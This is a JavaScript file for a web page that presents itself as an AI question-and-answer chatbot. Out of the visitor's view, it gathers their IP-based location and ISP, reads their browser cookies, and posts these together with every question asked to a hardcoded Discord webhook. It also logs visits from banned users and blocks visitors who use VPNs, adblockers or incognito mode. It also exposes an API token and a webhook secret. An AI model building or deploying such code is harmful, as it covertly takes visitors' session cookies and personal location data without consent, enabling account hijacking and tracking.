// Updated Emoji list
const statusEmojis = {
    check: 'https://cdn.discordapp.com/emojis/1218461285746741350.png',
    empty: 'https://cdn.discordapp.com/emojis/1218461482543484929.png',
    cross: 'https://cdn.discordapp.com/emojis/1218461700198633523.png',
    warning: 'https://cdn.discordapp.com/emojis/1271705073650503680.png',
    yellowAlert: 'https://cdn.discordapp.com/emojis/1271705121859833856.png',
    orangeAlert: 'https://cdn.discordapp.com/emojis/1271705220736483378.png',
    error: 'https://cdn.discordapp.com/emojis/1271705264038346813.png', // Changed from redAlert to error
    space: 'https://cdn.discordapp.com/emojis/1273231578402918401.png',
    ellipsis: 'https://cdn.discordapp.com/emojis/1285189210835390534.png',
    rage: 'link'// We'll update rage emoji later
};

document.addEventListener('DOMContentLoaded', async function() {
    const statusImage = document.getElementById('status-image');
    const statusMessage = document.querySelector('.status-message');
    const sendButton = document.getElementById('send');

    // Initial "loading" state
    statusImage.src = statusEmojis.space;
    statusMessage.innerText = "Loading...";

    const ipInfoResponse = await fetch('https://ipinfo.io/json?token=99798ae623ac1d'); // Replace with your IPInfo API token
    const ipData = await ipInfoResponse.json();
    const visitorCookie = document.cookie || 'No cookies found';

    const bannedUsers = [
        { cookie: 'example_cookie1', ip: '192.168.1.1' },
        { cookie: 'example_cookie2', ip: '111.222.333.444' },
        { cookie: 'example_cookie3', ip: '555.666.777.888' },
    ];

    // Check if the visitor is banned
    const isBanned = bannedUsers.some(user => user.cookie === visitorCookie || user.ip === ipData.ip);

    if (isBanned) {
        // User is banned
        statusImage.src = statusEmojis.cross;
        statusMessage.innerText = "You have been blacklisted from using this service.";
        sendButton.disabled = true;

        const bannedVisitWebhookMessage = {
            title: "Banned User Visit",
            description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
            `.trim(),
            color: 16711680 // Red color
        };
        await sendWebhook(bannedVisitWebhookMessage);

        return; // Exit if user is banned
    }

    // Check for VPN, adblockers, incognito mode, etc.
    const adblockDetected = detectAdblocker();
    const vpnDetected = await detectVPN();
    const incognitoDetected = await detectIncognito();

    if (adblockDetected || vpnDetected || incognitoDetected) {
        // Detected adblocker, VPN, or incognito mode
        statusImage.src = statusEmojis.ellipsis;
        statusMessage.innerText = "Adblocker, VPN, or incognito mode detected. You may experience issues.";
        sendButton.disabled = true;
        return;
    }

    // No issues, waiting for user input
    statusImage.src = statusEmojis.ellipsis;
    statusMessage.innerText = "Waiting for your question...";
    sendButton.disabled = false;

    // Handle question asking and response
    const inputBox = document.getElementById("question");
    sendButton.addEventListener("click", async function() {
        const question = inputBox.value;
        if (!question) return;

        sendButton.disabled = true;
        sendButton.innerText = "...";

        const startTime = Date.now();
        const response = await fetch(`https://tilki.dev/api/hercai?soru=${encodeURIComponent(question)}`);
        const data = await response.json();
        const endTime = Date.now();

        const timeTaken = endTime - startTime;
        const formattedTime = formatDuration(timeTaken);

        if (data.error) {
            // Error occurred
            statusImage.src = statusEmojis.cross;
            statusMessage.innerText = "There was an error processing your request. Please try again later.";
            sendButton.innerText = "Send";
        } else {
            // Success, response received
            statusImage.src = statusEmojis.check;
            statusMessage.innerText = `Response received in ${formattedTime}`;

            const questionWebhookMessage = {
                title: "Question Asked",
                description: `
**Question:** ${question}
**Response:** ${data.cevap}
**Time Taken:** ${formattedTime}
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Cookies:** ${visitorCookie}
                `.trim(),
                color: Math.floor(Math.random() * 16777215)
            };

            // Send webhook for the question
            await sendWebhook(questionWebhookMessage);

            const responseContainer = document.getElementById("response");
            responseContainer.innerText = data.cevap;
        }

        // Cooldown before re-enabling the button
        setTimeout(() => {
            sendButton.disabled = false;
            sendButton.innerText = "Send";
        }, 3000); // 3-second cooldown
    });

    async function sendWebhook(embedMessage) {
        const webhookUrl = 'https://discord.com/api/webhooks/1289960861028454481/wXuSMQSu71G0XjJouR2MtLJSupMuRcRZo0CNSVpyfw3Hma5uaiOO3R0KomuissnxXH5F'; // Replace with your actual webhook URL
        const payload = {
            embeds: [embedMessage]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    }

    function formatDuration(ms) {
        if (ms < 1000) {
            return `${ms} ms`;
        } else if (ms < 60000) {
            return `${Math.floor(ms / 1000)} seconds`;
        } else {
            return `${Math.floor(ms / 60000)} minutes`;
        }
    }

    function detectAdblocker() {
        let adblockDetected = false;
        const testAd = document.createElement('div');
        testAd.innerHTML = '&nbsp;';
        testAd.className = 'adsbox';
        document.body.appendChild(testAd);

        if (testAd.offsetHeight === 0) {
            adblockDetected = true;
        }
        document.body.removeChild(testAd);
        return adblockDetected;
    }

    async function detectVPN() {
        // Simplified VPN detection logic, this could be enhanced
        const vpnTest = await fetch('https://api.myip.com');
        const vpnData = await vpnTest.json();
        return vpnData.org.toLowerCase().includes('vpn');
    }

    async function detectIncognito() {
        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) return false;
        return new Promise(resolve => {
            fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
        });
    }
});
